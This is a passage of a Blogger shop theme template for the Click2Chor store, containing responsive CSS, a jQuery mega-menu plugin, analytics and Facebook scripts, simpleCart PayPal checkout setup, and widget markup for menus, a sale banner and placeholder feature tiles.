    position: static;
    display: block!important;
}
ul.megamenuid li div.megasubmenu {
    width: 100%;
    position: static;
    visibility: visible;
    opacity: 1;
    -moz-transform: none;
    -webkit-transform: none;
    -o-transform: none;
    transform: none;
    transform-origin: inherit;
}
#search-icon {
    width: 40px;
    line-height: 40px;
    height: 40px;
}
#nav-search {
top:40px;
}
.sora-cart-checkout-wrap #contact .contact-form-name {
    margin-right: 0;
}
#contact .contact-form-name, #contact .contact-form-email {
    width: 100%;
    height: 50px;
}
}
@media only screen and (max-width: 980px) {
.index .post-grid-item, .archive .post-grid-item {
    width: 32%;
}
.index .post-grid-item:nth-child(3n) {
    margin-right: 0;
}
.index .post-grid-item:nth-child(4n) {
    margin-right: 15px;
}
.item #main-wrapper, .statc_page #main-wrapper {
    float: none;
    width: 100%;
    margin: 0 auto;
}
.item #sidebar-wrapper, .statc_page #sidebar-wrapper {
    float: none;
    width: 100%;
    max-width: 330px;
    margin: 0 auto;
}
}
@media screen and (max-width: 880px) {
.top-bar-menu, .top-meta-menu {
    float: none;
    width: 100%;
    clear: both;
    margin-top: 0;
    margin-bottom: 10px;
    text-align: center;
}
.top-meta-menu ul {
text-align:center;
}
.top-meta-menu ul li {
    float: none;
}
.top-bar-menu .selectnav {
    display: inline-block;
}
#nav {
    display: none;
}
.selectnav {
    display: block;
    width: 100%;
    max-width: 200px;
}
.selectnav {
    color: #222;
    background: #f4f4f4;
    border: 1px solid rgba(255,255,255,0.1);
    position: relative;
    border: 0;
    padding: 6px 10px!important;
    margin: 5px 0;
}
.slide-menu-wrap .vertical-menu {
    width: 100%;
    float: none;
    clear: both;
    margin-bottom: 10px;
}
.feat-slider-wrap {
    width: 100%;
    float: none;
}
.special-tiles, .featured-product .custom-widget li, .random-product .custom-widget li, .popular-product .PopularPosts ul li {
    width: 50%;
    padding: 0 10px;
    margin-bottom: 10px;
}
.special-tiles:first-child, .special-tiles:last-child, .featured-product .custom-widget li:first-child, .featured-product .custom-widget li:nth-child(4n), .random-product .custom-widget li:first-child, .random-product .custom-widget li:nth-child(4n), .popular-product .PopularPosts ul li:first-child, .popular-product .PopularPosts ul li:nth-child(4n) {
    padding: 0 10px;
}
.index .post-grid, .archive .post-grid {
    text-align: center;
}
.index .post-grid-item, .archive .post-grid-item {
       width: 47.5%;
    display: inline-block;
    float: none;
}
.index .post-grid-item:nth-child(2n) {
    margin-right: 0;
}
.index .post-grid-item:nth-child(3n) {
    margin-right: 15px;
}
.email-folower .email-letter-text {
    float: none;
    width: 100%;
    padding: 15px 0;
}
.email-folower .follow-by-email-inner {
    float: none;
    width: 100%;
}
#lowerbar-wrapper {
    width: 100%;
    max-width: 375px;
    margin: 0 auto;
    float: none;
    clear: both;
}
.ty_footer_copyright {
    text-align: center;
    display: block;
    margin-bottom: 10px;
}
.ty_footer_bank_image {
    float: none;
    text-align: center;
}
}
@media only screen and (max-width: 768px) {
.ops-404 {
width: 80%!important;
}
.title-404 {
font-size: 160px!important;
}
}
@media screen and (max-width: 680px) {
.header-social {
    float: none;
    width: 100%;
    clear: both;
    margin-top: 0;
    margin-bottom: 10px;
    text-align: center;
}
.top-bar-social li, .bottom-bar-social li {
    display: inline-block;
    float: none;
}
.sora-cart {
    float: none;
    margin: 10px auto 0;
}
.mega-menu-wrap a#pull {
    padding: 10px 6%;
}
.index .post-grid-item, .archive .post-grid-item {
    width: 46.5%;
    display: inline-block;
    float: none;
}
.sora-product-detail .sora-product-image {
    float: none;
    margin-right: 0;
    width: 100%;
    margin-bottom: 10px;
}
.sora-product-detail .sora-product-image img {
    object-fit: cover;
}
.sora-product-detail .sora-pro-info {
    width: 100%;
    float: none;
}
}
@media only screen and (max-width: 480px) {
.sora-cart-description {
   left: -50%;
    right: -50%;
    margin: 0 auto;
}
.special-tiles, .featured-product .custom-widget li, .random-product .custom-widget li, .popular-product .PopularPosts ul li {
    width: 100%;
    padding: 0 auto;
    margin-bottom: 10px;
}

.index .post-grid-item, .archive .post-grid-item {
    width: 100%;
    display: block;
    float: none;
margin:0 auto;
}
.top-meta-menu {
    display: none;
}
.mega-menu-wrap a#pull {
    padding: 10px 7%;
}
.related li {
    width: 100%;
    padding: 0!important;
}
.sora-product-detail .sora-pro-info .post-head h1 {
line-height: 1.4em;
font-size: 19px;
}
#main-wrapper .custom-title, .related-product .custom-title, .featured-product .custom-title, .random-product .custom-title, .popular-product .custom-title {
font-size:10px;
}
.comments .comments-content .datetime {
    display: none;
}
}
@media only screen and (max-width: 360px) {
.top-bar-social #social a {
    width: 20px;
    height: 20px;
    line-height: 20px;
}
.mega-menu-wrap a#pull {
    padding: 10px 8%;
}
}
@media only screen and (max-width: 300px) {
#sidebar-wrapper,#search-icon {display:none}
.archive .post h2,.index .post h2 {
line-height: 1.4em !important;
font-size: 14px!important;
}
.ops-404 {
font-size: 18px!important;
}
.title-404 {
font-size: 110px !important;
}
.sora-checkout-wrap .item-thumb {
    display: none;
}
}
</style>
<b:template-skin><![CDATA[
/*------Layout (No Edit)----------*/
body#layout #outer-wrapper {
    padding: 0;
    width: 800px
}
body#layout #loader, body#layout #status {
display: none;
}
body#layout .section h4 {
color: #333!important;
text-align:center;
text-transform:uppercase;
letter-spacing:1.5px;
}
body#layout #content-wrapper {
    margin: 0 auto
}

body#layout #main-wrapper {
    float: left;
    width: 70%;
    margin: 0;
    padding: 0
}

body#layout #sidebar-wrapper {
float: right;
width: 30%;
margin: 0;
padding: 0;
display: block;
visibility: visible;
height: auto;
opacity: 1;
}
body#layout #sidebar-wrapper .section {
    background-color: #fff;
    border: 1px solid #fff
}
body#layout #sidebar-wrapper .section .widget-content {
    border-color: #5a7ea2!important
}
body#layout #sidebar-wrapper .section .draggable-widget .widget-wrap2 {
    background-color: #5a7ea2!important
}

body#layout #main-wrapper #main {
    margin-right: 4px;
    background-color: #5a7ea2;
    border-color: #34495e
}
body#layout #main-wrapper #main h4 {
    color: #fff!important
}
body#layout .layout-widget-description {
    display: none!important
}
body#layout #Blog1 .widget-content {
    border-color: #34495e
}
body#layout #lowerbar-wrapper {
width: 33.33%;
float: left;
}
body#layout .top-bar-menu, body#layout .top-meta-menu {
    width: 50%;
}
body#layout .headerleft {
    width: 356px;
}
body#layout .headerright {
    width: 400px;
    padding: 0;
}
body#layout .headerleft {
    display: block;
}
body#layout .header-social {
    display: block;
}
body#layout .mega-menu-full {
    display: none;
}
body#layout .vertical-menu {
    width: 50%;
    float: left;
}
body#layout .feat-slider-wrap {
    width: 50%;
    float: right;
}
/*------Layout (end)----------*/
]]></b:template-skin>

<b:include data='blog' name='google-analytics'/>
<script src='https://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js' type='text/javascript'/>
<script async='async' type='text/javascript'>
//<![CDATA[
(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.5";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));
//]]>
</script>

<script type='text/javascript'>
//<![CDATA[
(function(e){var t=function(e,t){this.elem=e;this.settings=t;this.megaMenuHtml();this.ajaxcall=null;this.menulist=this.elem.find(".leftmenulist li a");this.menuHelper(this.elem);this.addEvents()};t.prototype={regex:{islabel:new RegExp("/search/label/","g"),issearch:new RegExp("[?&]q=","g"),labelsearch:new RegExp("(http://[^/]+)/search/label/([^/?&]+).*[?&]q=([^$&]+)(?:[^$]+)?","g"),label:new RegExp("(http://[^/]+)/search/label/([^/?&$]+)","g"),search:new RegExp("(http://[^/]+)/search/?[?&]q=(.*)","g")},addEvents:function(){var t=this;this.menulist.hover(function(){if(e(this).data("menuloaded")!=="true"){t.li=e(this);t.url=t.li.attr("href");t.container=t.li.closest("ul").siblings("ul");t.hoverOver()}},function(){t.hoverOut()})},hoverOver:function(){var t=this;this.getAJAXUrl();if(!this.ajaxUrl)return;this.ajaxcall=e.ajax({type:"GET",url:t.ajaxUrl,dataType:"jsonp",data:t.ajaxData,beforeSend:function(){t.showLoader()},success:function(e){t.hideLoader();t.addArrow();t.showPosts(e)},error:function(e){t.showError(e)}})},hoverOut:function(){this.ajaxcall.abort();this.hideLoader()},getAJAXUrl:function(){if(this.url){var e=this;this.ajaxData={alt:"json","max-results":this.settings.postsNumber};this.url.search(this.regex.islabel)!==-1&&this.url.search(this.regex.issearch)!==-1?this.ajaxUrl=this.url.replace(this.regex.labelsearch,function(t,n,r,i){e.ajaxData.q=i;return[n,"/feeds/posts/default/-/",r,"/"].join("")}):this.url.search(this.regex.islabel)!==-1&&this.url.search(this.regex.issearch)===-1?this.ajaxUrl=this.url.replace(this.regex.label,function(t,n,r){delete e.ajaxData.q;return[n,"/feeds/posts/default/-/",r,"/"].join("")}):this.url.search(this.regex.islabel)===-1&&this.url.search(this.regex.issearch)!==-1?this.ajaxUrl=this.url.replace(this.regex.search,function(t,n,r){e.ajaxData.q=r;return[n,"/feeds/posts/default"].join("")}):this.ajaxUrl=!1}else this.ajaxUrl=!1},showLoader:function(){e("<span></span>",{"class":"loading-icon"}).appendTo(this.li.closest("li"))},hideLoader:function(){this.li.closest("li").find("span.loading-icon").remove()},showPosts:function(t){var n=this,r=[],i,s,o;t.feed.openSearch$totalResults.$t>0?e.each(t.feed.entry,function(t,u){i=u.title.$t;e.each(u.link,function(e,t){t.rel==="alternate"?s=t.href:s="#"});o=u.media$thumbnail?u.media$thumbnail.url.replace(/\/s72\-c\//,"/s200-c/"):n.settings.noThumbnail;r.push('<li><span class="thumb-container"><a title="',i,'" href="',s,'"><img alt="',i,'" src="',o,'"/><br />',i,"</a></span></li>")}):r.push("<h5>","No posts available.","</h5>");this.container.html(r.join(""));this.menulist.removeData("menuloaded");this.li.data("menuloaded","true")},showError:function(e){if(e.statusText==="error"){this.hideLoader();this.addArrow();this.container.html("<h5>Oops... Could not fetch the blog posts.</h5>")}},addArrow:function(){this.menulist.closest("li").find("span").remove();this.menulist.removeClass("hover-menu");this.li.addClass("hover-menu");e("<span></span>",{"class":"menu-icon"}).appendTo(this.li.closest("li"))},menuHelper:function(t){var n=this;t.find(">li").hover(function(){var t=e(this);t.find("a:first").addClass("hover-menu");var r=e(this).find("ul.leftmenulist li").height()*e(this).find("ul.leftmenulist li").length;t.find("ul.rightmenulist").css({"min-height":r+"px"});n.requestFirstAjax(t)},function(){e(this).find("a:first").removeClass("hover-menu")})},megaMenuHtml:function(){this.elem.find("ul ul").remove();this.elem.addClass("megamenuid").find(">li").find("ul:first").addClass("leftmenulist").wrap(e("<div></div>",{"class":this.settings.divClass}));e("ul.leftmenulist").after(e("<ul></ul>",{"class":"rightmenulist"}))},requestFirstAjax:function(e){e=e.find(".leftmenulist li:first-child a");this.url=e.attr("href");this.container=e.closest("ul").siblings("ul");this.li=e;this.hoverOver()}};e.fn.megaBloggerMenu=function(n){var r={postsNumber:4,divClass:"megasubmenu",postsClass:"rightmenulist",noThumbnail:"/default.png"},i=e.extend({},r,n);return this.each(function(){var n=new t(e(this),i)})}})(jQuery);
//]]>
</script>
<script type='text/javascript'>
//<![CDATA[
jQuery(document).ready(function($) {
 $('#megamenuid').megaBloggerMenu({
  postsNumber : 4, // Number of Posts to show
  noThumbnail : 'http://2.bp.blogspot.com/-Z7jG9iO9OTg/Vazz6YJnFQI/AAAAAAAALVs/wlSvXPgdDAo/s1600/no_image_available.png' // Default thumbnail Image
 });
});


$(function() {
	var pull = $('#pull');
	menu = $('.mega-menu-wrap ul');
	menuHeight = menu.height();
	$(pull).on('click', function(e) {
		e.preventDefault();
		menu.slideToggle()
	});
	$(window).resize(function() {
		var w = $(window).width();
		if (w > 320 && menu.is(':hidden')) {
			menu.removeAttr('style')
		}
	})
});

$(function(){
  $('.search-here').submit(function(e){
    if($('.search-box .search-field').val().length==0){
       $('.search-box .search-alert').fadeIn().css('display','inline-block');
      e.preventDefault();
    }
  });
});
//]]>
</script>
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async='async' src='https://www.googletagmanager.com/gtag/js?id=UA-114276791-1'/>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag(&#39;js&#39;, new Date());

  gtag(&#39;config&#39;, &#39;UA-114276791-1&#39;);
</script>
</head>
<body expr:class='data:blog.pageType'>
<script>
//<![CDATA[
$(document).ready(function () {
		simpleCart({
			checkout: { 
				type: "PayPal" , 
				email: "templatemania@yahoo.com" 
			}
		});	
simpleCart.currency( "USD" );
});	
//]]>
</script>
<div id='status'/>
<div id='loader'/>
&lt;div id=&quot;outer-wrapper&quot; class=&quot;<data:blog.pageType/><b:if cond='data:blog.url == data:blog.homepageUrl'> home</b:if><b:if cond='data:blog.pageType == &quot;static_page&quot;'> item</b:if><b:if cond='data:blog.pageType == &quot;archive&quot;'> index</b:if>&quot;&gt;
<div class='top-bar'>

		<div class='top-bar-wrapper row'>

			<div class='top-meta-menu'>
  <b:section class='top-meta-info-menu' id='Contact Details' maxwidgets='1' showaddelement='yes'>
    <b:widget id='LinkList640' locked='true' title='Main Menu' type='LinkList' version='1'>
      <b:widget-settings>
        <b:widget-setting name='sorting'>NONE</b:widget-setting>
        <b:widget-setting name='text-1'><![CDATA[<i class="fa fa-phone"></i> +91-8712725068]]></b:widget-setting>
        <b:widget-setting name='link-1'>#</b:widget-setting>
        <b:widget-setting name='text-0'><![CDATA[<i class="fa fa-envelope"></i> click2chor@gmail.com]]></b:widget-setting>
        <b:widget-setting name='link-0'>mailto:mail@xyz.com</b:widget-setting>
      </b:widget-settings>
      <b:includable id='main'>
          <div class='widget-content'>
            <ul id='nav1' itemscope='' itemtype='http://schema.org/SiteNavigationElement'> 
              <b:loop values='data:links' var='link'>
                <li itemprop='name'><a expr:href='data:link.target' itemprop='url'><data:link.name/></a></li>
              </b:loop>
           </ul>
         

          </div>
        </b:includable>
    </b:widget>
  </b:section>
</div>
	<div class='top-bar-menu'>


<div class='top-menu'>
  <b:section class='top-menu' id='top-menu' maxwidgets='1' showaddelement='yes'>
    <b:widget id='LinkList940' locked='true' title='Main Menu' type='LinkList' version='1'>
      <b:widget-settings>
        <b:widget-setting name='sorting'>NONE</b:widget-setting>
        <b:widget-setting name='text-0'>About</b:widget-setting>
        <b:widget-setting name='link-0'>http://sora-cart-soratemplates.blogspot.in/p/about.html</b:widget-setting>
      </b:widget-settings>
      <b:includable id='main'>
          <div class='widget-content'>
            <ul id='nav' itemscope='' itemtype='http://schema.org/SiteNavigationElement'> 
              <b:loop values='data:links' var='link'>
                <li itemprop='name'><a expr:href='data:link.target' itemprop='url'><data:link.name/></a></li>
              </b:loop>
           </ul>
         

          </div>
        </b:includable>
    </b:widget>
  </b:section>
</div>
</div>
 		</div>

	</div>
<div style='clear: both;'/>
<div id='header-wrapper'>
<div class='row' id='header-wrappers'>
    <div class='headerleft'>
      <b:section class='headerleft' id='headerleft' maxwidgets='1' name='Blog Logo' showaddelement='no'>
        <b:widget id='Header1' locked='true' title='Click2Chor (Header)' type='Header' version='1'>
          <b:widget-settings>
            <b:widget-setting name='displayUrl'>http://1.bp.blogspot.com/-6N8IY42cyKs/WofHseSCWsI/AAAAAAAAANg/IjQmG7f_EHId4Oal7Wf0mZtGm674hPZPwCK4BGAYYCw/s1600/170_40.jpg</b:widget-setting>
            <b:widget-setting name='displayHeight'>40</b:widget-setting>
            <b:widget-setting name='sectionWidth'>390</b:widget-setting>
            <b:widget-setting name='useImage'>true</b:widget-setting>
            <b:widget-setting name='shrinkToFit'>false</b:widget-setting>
            <b:widget-setting name='imagePlacement'>REPLACE</b:widget-setting>
            <b:widget-setting name='displayWidth'>139</b:widget-setting>
          </b:widget-settings>
          <b:includable id='main'>
  <b:if cond='data:useImage'>
    <b:if cond='data:imagePlacement == &quot;BEHIND&quot;'>
      <!--
      Show image as background to text. You can't really calculate the width
      reliably in JS because margins are not taken into account by any of
      clientWidth, offsetWidth or scrollWidth, so we don't force a minimum
      width if the user is using shrink to fit.
      This results in a margin-width's worth of pixels being cropped. If the
      user is not using shrink to fit then we expand the header.
      -->
      <b:if cond='data:mobile'>
        <div id='header-inner'>
          <div class='titlewrapper' style='background: transparent'>
            <h1 class='title' style='background: transparent; border-width: 0px'>
              <b:include name='title'/>
            </h1>
          </div>
          <b:include name='description'/>
        </div>
      <b:else/>
        <div expr:style='&quot;background-image: url(\&quot;&quot; + data:sourceUrl + &quot;\&quot;); &quot;                      + &quot;background-position: &quot;                      + data:backgroundPositionStyleStr + &quot;; &quot;                      + data:widthStyleStr                      + &quot;min-height: &quot; + data:height                      + &quot;_height: &quot; + data:height                      + &quot;background-repeat: no-repeat; &quot;' id='header-inner'>
          <div class='titlewrapper' style='background: transparent'>
            <h1 class='title' style='background: transparent; border-width: 0px'>
              <b:include name='title'/>
            </h1>
          </div>
          <b:include name='description'/>
        </div>
      </b:if>
    <b:else/>
      <!--Show the image only-->
      <div id='header-inner'>
        <a expr:href='data:blog.homepageUrl' style='display: block'><h1 style='display:none'/>
          <img expr:alt='data:title' expr:height='data:height' expr:id='data:widget.instanceId + &quot;_headerimg&quot;' expr:src='data:sourceUrl' expr:width='data:width' style='display: block'/>
        </a>
        <!--Show the description-->
        <b:if cond='data:imagePlacement == &quot;BEFORE_DESCRIPTION&quot;'>
          <b:include name='description'/>
        </b:if>
      </div>
    </b:if>
  <b:else/>
    <!--No header image -->
    <div id='header-inner'>
      <div class='titlewrapper'>
        <h1 class='title'>
          <b:include name='title'/>
        </h1>
      </div>
      <b:include name='description'/>
    </div>
  </b:if>
</b:includable>
          <b:includable id='description'>
  <div class='descriptionwrapper'>
    <p class='description'><span><data:description/></span></p>
  </div>
</b:includable>
          <b:includable id='title'>
  <b:if cond='data:blog.url == data:blog.homepageUrl'>
    <data:title/>
  <b:else/>
    <a expr:href='data:blog.homepageUrl'><data:title/></a>
  </b:if>
</b:includable>
        </b:widget>
      </b:section>
</div>
<div class='headerright'>
<div class='header-social'>
<b:section class='top-bar-social blue' id='header social widget' maxwidgets='1' name='Top Social Widget' showaddelement='no'>
  <b:widget id='LinkList230' locked='true' title='Social Media Icons' type='LinkList' version='1'>
    <b:widget-settings>
      <b:widget-setting name='link-3'>#</b:widget-setting>
      <b:widget-setting name='sorting'>NONE</b:widget-setting>
      <b:widget-setting name='link-4'>#</b:widget-setting>
      <b:widget-setting name='text-1'>facebook</b:widget-setting>
      <b:widget-setting name='link-1'>#</b:widget-setting>
      <b:widget-setting name='text-0'>twitter</b:widget-setting>
      <b:widget-setting name='link-2'>#</b:widget-setting>
      <b:widget-setting name='text-3'>instagram</b:widget-setting>
      <b:widget-setting name='link-0'>#</b:widget-setting>
      <b:widget-setting name='text-2'>gplus</b:widget-setting>
      <b:widget-setting name='text-4'>email</b:widget-setting>
    </b:widget-settings>
    <b:includable id='main'>
            <div class='widget-content'>
              <ul id='social'>
                <b:loop values='data:links' var='link'>
                  <li><a expr:class='data:link.name' expr:href='data:link.target' expr:title='data:link.name'/></li>
                </b:loop>
              </ul>
            </div>
          </b:includable>
  </b:widget>
</b:section>
  </div>
<div class='sora-cart'>
<div class='sora-cart-logo'>
<div class='sora-cart-details'>
  <b>My Cart</b> <span class='simpleCart_quantity'/> item(s) <br/>
</div>
</div>
<div class='sora-cart-description'>
<div class='simpleCart_items'/>
	<div class='sora-cart-buttons-wrap'>
      <div class='sora-cart-ammount'><span class='sora-cart-subtotal'>SUBTOTAL :</span><span class='simpleCart_total'/></div>
	<div class='sora-cart-buttons'>
  <a class='simpleCart_empty' href='javascript:;'><span>empty cart</span></a>
	
  <a class='simpleCart_checkout' href='/p/checkout.html'><span>checkout</span></a>
  </div></div>
	</div>
</div></div>
<div style='clear: both;'/>
  </div>
 </div>
<div class='mega-menu-full'>
<div class='row mega-menu-wrap'>
<ul class='megamenu' id='megamenuid'>
<li><a href='/'>Home</a></li> 
<li><a class='menu-target' href='#'>Fashion</a>
<ul>
<li><a href='https://click2chor.blogspot.in/search/label/men'>Men</a></li>
<li><a href='https://click2chor.blogspot.in/search/label/women'>Women</a></li>
<li><a href='https://click2chor.blogspot.in/search/label/kids'>Kids</a></li>
<li><a href='https://click2chor.blogspot.in/search/label/beauty'>Beauty</a></li>
</ul>
</li>
<li><a class='menu-target' href='#'>Electronics</a>
<ul>
<li><a href='https://click2chor.blogspot.in/search/label/smartphones'>SmartPhones</a></li>
<li><a href='https://click2chor.blogspot.in/search/label/laptops'>Laptops</a></li>
<li><a href='https://click2chor.blogspot.in/search/label/cameras'>Cameras</a></li>
</ul>
</li>
<li><a class='menu-target' href='#'>Accessories</a>
<ul>
<li><a href='https://click2chor.blogspot.in/search/label/headphones'>Headphones</a></li>
<li><a href='https://click2chor.blogspot.in/search/label/trimmers'>Trimmers</a></li>
<li><a href='https://click2chor.blogspot.in/search/label/powerbanks'>Powerbanks</a></li>
<li><a href='https://click2chor.blogspot.in/search/label/cases'>Cases And Covers</a></li>
</ul>
</li>
<li><a href='https://click2chor.blogspot.in/search/label/todaydeals'>Today Deals</a></li>
<!--<li><a href='http://www.soratemplates.com/2017/07/sora-cart-blogger-templates.html'>Download This Template</a></li>-->
</ul>
<a href='#' id='pull'>Menu</a>
<span id='search-icon'><i class='fa fa-search'/></span>
<div id='nav-search'>
<form action='/search/max-results=7' id='searchform' method='get'>
  <input id='s' name='q' placeholder='Enter search term...' type='text'/>
  <input id='searchsubmit' type='submit' value='Search'/>
</form>
</div>


  </div>
  </div>
<div style='clear: both;'/>
<b:if cond='data:blog.url == data:blog.homepageUrl'>
<div class='slide-menu-wrap row'>
<div class='vertical-menu'>
  <b:section class='slide-menu' id='slide-menu' maxwidgets='1' name='Vertical icon Menu' showaddelement='yes'>
    <b:widget id='LinkList960' locked='true' title='All Collections' type='LinkList' version='1'>
      <b:widget-settings>
        <b:widget-setting name='link-7'>#</b:widget-setting>
        <b:widget-setting name='link-5'>#</b:widget-setting>
        <b:widget-setting name='link-6'>#</b:widget-setting>
        <b:widget-setting name='link-3'>#</b:widget-setting>
        <b:widget-setting name='link-4'>#</b:widget-setting>
        <b:widget-setting name='text-1'><![CDATA[<i class="fa fa-camera"></i>Camera]]></b:widget-setting>
        <b:widget-setting name='text-0'><![CDATA[<i class="fa fa-heartbeat"></i>Health Care]]></b:widget-setting>
        <b:widget-setting name='text-3'><![CDATA[<i class="fa fa-cutlery"></i>Cutlery]]></b:widget-setting>
        <b:widget-setting name='text-2'><![CDATA[<i class="fa fa-book"></i>Books]]></b:widget-setting>
        <b:widget-setting name='text-5'><![CDATA[<i class="fa fa-motorcycle"></i>Motorbikes]]></b:widget-setting>
        <b:widget-setting name='text-4'><![CDATA[<i class="fa fa-soccer-ball-o"></i>Sports]]></b:widget-setting>
        <b:widget-setting name='text-7'><![CDATA[<i class="fa fa-wrench"></i>Tools]]></b:widget-setting>
        <b:widget-setting name='text-6'><![CDATA[<i class="fa fa-car"></i>Cars]]></b:widget-setting>
        <b:widget-setting name='sorting'>NONE</b:widget-setting>
        <b:widget-setting name='link-1'>#</b:widget-setting>
        <b:widget-setting name='link-2'>#</b:widget-setting>
        <b:widget-setting name='link-0'>#</b:widget-setting>
      </b:widget-settings>
      <b:includable id='main'>
 <!-- only display title if it's non-empty -->
  <b:if cond='data:title != &quot;&quot;'>
    <h2 class='title'><data:title/></h2>
  </b:if>
          <div class='widget-content'>
            <ul id='nav3' itemscope='' itemtype='http://schema.org/SiteNavigationElement'> 
              <b:loop values='data:links' var='link'>
                <li itemprop='name'><a expr:href='data:link.target' itemprop='url'><data:link.name/></a></li>
              </b:loop>
           </ul>
         

          </div>
        </b:includable>
    </b:widget>
  </b:section>
</div>
<div class='feat-slider-wrap'>
 <b:section class='ty-slide-show' id='Slider Widget' maxwidget='1' showaddelement='no'>
   <b:widget id='HTML218' locked='false' title='' type='HTML' version='1'>
     <b:widget-settings>
       <b:widget-setting name='content'><![CDATA[<div class="tagpost" data-label="latestpros" data-no="6"></div>]]></b:widget-setting>
     </b:widget-settings>
     <b:includable id='main'>
  <!-- only display title if it's non-empty -->
  <b:if cond='data:title != &quot;&quot;'>
    <h2 class='title'><data:title/></h2>
  </b:if>
  <div class='widget-content'>
    <data:content/>
  </div>

 <!--b:include name='quickedit'/-->
</b:includable>
   </b:widget>
 </b:section>
</div>
  </div>
<div style='clear: both;'/>
  </b:if>
<div class='res-pro-ad row'>
  <b:section class='responsive-ads' id='res-head-ad' maxwidgets='1' name='Responsive Ads' showaddelement='yes'>
    <b:widget id='HTML1' locked='false' title='Video of the day' type='HTML'>
      <b:widget-settings>
        <b:widget-setting name='content'>&lt;div id=&quot;banner-1&quot; class=&quot;banner&quot;&gt;

		&lt;a class=&quot;banner__permalink&quot; href=&quot;#&quot;&gt;
		&lt;span class=&quot;screen-reader-text&quot;&gt;Introducing the Vacation Collection &#8212; Up to 50% Off&lt;/span&gt;
	&lt;/a&gt;
	
	&lt;div class=&quot;banner__inside-wrapper&quot;&gt;
	&lt;div class=&quot;banner__inside&quot;&gt;
		&lt;div class=&quot;banner__content&quot;&gt;

						&lt;h3 class=&quot;banner__title&quot;&gt;Pick Any 5 Appearal at just 999/- only &lt;/h3&gt;
			
			
			
		&lt;/div&gt;

		 
		&lt;div class=&quot;banner__overlay&quot;&gt;&lt;/div&gt;
		
				&lt;div class=&quot;banner__bg_image&quot;&gt;&lt;/div&gt;
			&lt;/div&gt;
	&lt;/div&gt;
&lt;/div&gt;
&lt;style type=&quot;text/css&quot;&gt;
.banner {
    position: relative;
    color: #fff;
}
	#banner-1 {
    min-height: 130px;
    background-color: #c6b78b;
}
#banner-1 .banner__title {
    font-size: 28px;
    letter-spacing: 0px;
}
#banner-1 .banner__subtitle {
    font-size: 14px;
    color: rgba(255, 255, 255, 0.85);
}
#banner-1 .banner__inside {
    height: 130px;
    padding: 8px;
}
#banner-1 .banner__content {
    border-width: 2px;
    border-color: rgba(255, 255, 255, 0.5);
}
#banner-1 .banner__sep {
    margin-top: 8px;
    margin-bottom: 8px;
    width: 20%;
}
#banner-1 .banner__bg_image {
    background-image: url(&#39;https://4.bp.blogspot.com/-zKl8aUyjYfw/WokDLzrsa3I/AAAAAAAAARg/WhJdo85KWxgOxpQsTvpd7hIfsFccdIW6ACLcBGAs/s320/BF999_4.jpg&quot; width=&quot;320&quot;&#39;);
}
#banner-1 .banner__overlay {
    background-color: #0a0000;
    opacity: 0.3;
}
.banner__bg_image {
    position: absolute;
    top: 0;
    bottom: 0;
    right: 0;
    left: 0;
    background-position: center center;
    background-repeat: no-repeat;
    -webkit-background-size: cover;
    background-size: cover;
    z-index: 1;
    -webkit-transition: -webkit-transform 1s ease-in-out;
    -o-transition: -o-transform 1s ease-in-out;
    transition: transform 1s ease-in-out;
    will-change: transform;
}
.banner__overlay {
    background: #000;
    position: absolute;
    top: 0;
    bottom: 0;
    left: 0;
    right: 0;
    z-index: 2;
}
.banner__content {
    word-break: break-all;
    padding: 18px 30px;
    display: table-cell;
    vertical-align: middle;
    border: 2px solid #fff;
    text-align: center;
    position: relative;
    z-index: 3;
}
.banner__title {
    color: inherit;
    margin: 0;
}
.banner__inside {
    display: table;
    width: 100%;
    box-sizing: border-box;
}
.banner__inside-wrapper {
    overflow: hidden;
    position: relative;
}
.banner__permalink {
    position: absolute;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    z-index: 4;
}
.screen-reader-text {
    clip: rect(1px, 1px, 1px, 1px);
    height: 1px;
    overflow: hidden;
    position: absolute !important;
    width: 1px;
}
.banner:hover .banner__bg_image, .banner__permalink:focus ~ .banner__inside-wrapper .banner__bg_image {
    -webkit-transform: scale(1.1);
    -ms-transform: scale(1.1);
    -o-transform: scale(1.1);
    transform: scale(1.1);
}
&lt;/style&gt;</b:widget-setting>
      </b:widget-settings>
      <b:includable id='main'>
  <!-- only display title if it's non-empty -->
  <b:if cond='data:title != &quot;&quot;'>
    <h2 class='title'><data:title/></h2>
  </b:if>
  <div class='widget-content'>
    <data:content/>
  </div>

  <b:include name='quickedit'/>
</b:includable>
    </b:widget>
  </b:section>
</div>
<div style='clear: both;'/>
<b:if cond='data:blog.url == data:blog.homepageUrl'>
<div class='special-wrap row'>
<!-- First -->
<div class='special-tiles'>
<div class='special-tiles-wrap'>
<span class='special-icons'>
<i aria-hidden='true' class='fa fa-support'/>
</span>
  <h6 class='special-heading'>24/7 Customer Care</h6>
<p class='special-text'>Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry&#39;s. </p>
</div></div>
<!-- First One Ends -->

<!-- Second -->
<div class='special-tiles'>
<div class='special-tiles-wrap'>
<span class='special-icons'>
<i aria-hidden='true' class='fa fa-money'/>
</span>
<h6 class='special-heading'>Cash On Delivery</h6>
<p class='special-text'>Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry&#39;s. </p>
  </div></div>
<!-- Second Ends -->

<!-- Third -->
<div class='special-tiles'>
<div class='special-tiles-wrap'>
<span class='special-icons'>
<i aria-hidden='true' class='fa fa-clock-o'/>
</span>
<h6 class='special-heading'>One Day Shipping</h6>
<p class='special-text'>Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry&#39;s. </p>
  </div></div>
<!-- Third Ends -->

<!-- Fourth -->
<div class='special-tiles'>
<div class='special-tiles-wrap'>
<span class='special-icons'>
<i aria-hidden='true' class='fa fa-plane'/>
</span>
<h6 class='special-heading'>Worldwide Shipping</h6>
<p class='special-text'>Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry&#39;s. </p>
  </div></div>
<!-- Fourth Ends -->

</div>
<div style='clear: both;'/>
<div class='featured-product row'>
